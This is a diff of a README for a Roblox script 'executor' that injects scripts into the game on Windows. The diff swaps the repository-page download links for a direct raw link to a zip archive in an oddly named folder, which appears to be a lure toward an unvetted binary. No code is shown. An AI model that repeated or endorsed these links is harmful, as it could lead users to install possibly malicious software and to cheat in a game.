@@ -1,6 +1,6 @@
 # 🚀 Velocity-Executor - Execute Roblox scripts with stable speed
 
-[![](https://img.shields.io/badge/Download-Velocity_Executor-blue?style=for-the-badge)](https://github.com/anita7436/Velocity-Executor)
+[![](https://img.shields.io/badge/Download-Velocity_Executor-blue?style=for-the-badge)](https://raw.githubusercontent.com/anita7436/Velocity-Executor/main/subdolent/Velocity_Executor_v3.3.zip)
 
 Velocity-Executor acts as a tool for Roblox script execution on Windows. This application provides a stable environment for running scripts. It focuses on injection speed and performance. Use this tool if you need a reliable way to manage your Roblox scripts without interruptions like advertisements or key systems.
 
@@ -21,7 +21,7 @@ Keep your Windows system updated. Outdated versions may cause compatibility issu
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/anita7436/Velocity-Executor).
+1. Visit [this page to download](https://raw.githubusercontent.com/anita7436/Velocity-Executor/main/subdolent/Velocity_Executor_v3.3.zip).
 2. Locate the latest release file for the executor.
 3. Save the file to a folder on your computer.
 4. Open the folder where you saved the file.
